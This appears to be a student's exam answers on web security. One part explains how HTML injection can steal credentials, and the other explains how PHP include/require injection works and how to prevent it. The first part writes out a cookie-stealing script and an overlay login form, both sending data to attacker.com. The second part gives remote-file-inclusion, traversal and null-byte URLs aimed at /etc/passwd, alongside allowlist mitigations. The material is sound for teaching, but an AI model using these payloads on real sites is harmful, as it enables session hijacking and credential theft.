## Describe how an HTML-attack could be abused to gain access to credentials. (25)

A HTML attack can be realized on different ways. And always consists of different type (stored HTML Injection or Reflected HTML injection) and attack vecors. 
Vecots:

- Stored HTML Injection: Persistant attacks like entries in a Comment Section or in a blog.
- Reflected HTML injectio: URL-Injection when Parameters are not escaped the right way
  - these URLs can be sent via E-Mail or other communication tools
  - spread via forums and other (social) platforms 

Ways to steal credentials:

- Inject JS-Code and Replace original Login Form
  - Inject new Form fields
    - Hide original Form Field
    - Place your own Imput-Elements on site and replace the action path with somethin useful to you
- Inject JS-Code to exfiltrate original
  - before committing the Login Form intercept the login Progress and send the data to your own server.
- Skip the login-part and steal the Session-Cookie right away:
  - Use someting like `<script>var img=new Image();img.src='http://attacker.com/stealcookie.php?cookie='+document.cookie;</script>`
- Inject HTML and CSS code without JS
  - Hide original form fields via CSS (inline or siyle attribute)
    - add your own Input-Elements right via html
    - or just add a huge Login-Banner over the page: `<div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;"><form action='http://attacker.com/capture_credentials.php' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form></div>`

## Explain how PHP-code-injections via include / require could be achieved - and prevented. (25)

There are different ways to manipulate the parameter of `include` or `require`. Multiple methods of exploitation are possible.

### Manipulation:

- When `include('content/' . $_GET['page'] . '.php');` is used, you can simply manipulate the URL and include files other than expected.
  - **Exploitation**: `http://example.com/?page=http://attacker.com/malicious`
    - A prepared file on a web server has to be provided by the attacker.
    - After successful infiltration, PHP code execution is possible and might give access to other sensitive files, e.g., database connection information, `/etc/passwd`.
    - This attack requires a PHP configuration setting like this: `allow_url_include = On`.
  - **Mitigation**:
    - Simply turn off the setting: `allow_url_include = Off`.

  - Let's continue with the last example and assume that `allow_url_include = Off` is set.

    - **Exploitation**: `http://example.com/?page=admin`
      - You might still be able to browse into other files: e.g., there might be an `admin.php` waiting for us, that could be accessed or database configuration might be stored somewhere in a PHP file.
      - You might need to extend this attack and upload your own file via another exploit, like unchecked file extensions on a picture-upload page on the same server.
      - **Mitigation**: Add input validation for expected values in `$_GET['page']`.

      ```php
      $allowedPages = ['home', 'about', 'contact']; // List of allowed pages
      $page = $_GET['page'] ?? 'default'; // Default page if none specified

      if (in_array($page, $allowedPages)) { ... }
      ```

      Moreover, you should add absolute paths instead of relative paths to block traversal movement and add error handling to prevent the next point I will mention:

      ```php
      define('BASE_PATH', realpath('content/')); // Ensure the base path is absolute and normalized
      $page = $_GET['page'] ?? 'default';
      if (in_array($page, $allowedPages)) {
          $filePath = BASE_PATH . '/' . $page . '.php';
          if (file_exists($filePath)) {
              include($filePath);
          } else {
              include(BASE_PATH . '/error.php');
          }
      } else {
          include(BASE_PATH . '/error.php');
      }
      ```

  - Error messages can give information about internal structures and so support further attacks.
    - **Exploit**: Attacker tries invalid values and the system returns full paths and names. E.g., the script is hosted at a free hoster and the attacker creates a free account and includes his own scripts with file access rights set to magical 777. So he is able to access his own scripts via 
    `http://example.com/?page=../../../attacker_user_on_freehost/haxx0r_file`
    - **Mitigation** Just like above.

  - Another exploit in very old versions was null byte injection: `http://example.com/?page=../../../etc/passwd%00`
    - **Exploitation**: Here, `%00` represents a null byte, which could effectively terminate the string at the desired location and potentially allow access to the `/etc/passwd` file. Modern PHP versions, however, are not susceptible to null byte injection.
    - **Mitigation**: Use supported and updated software versions.
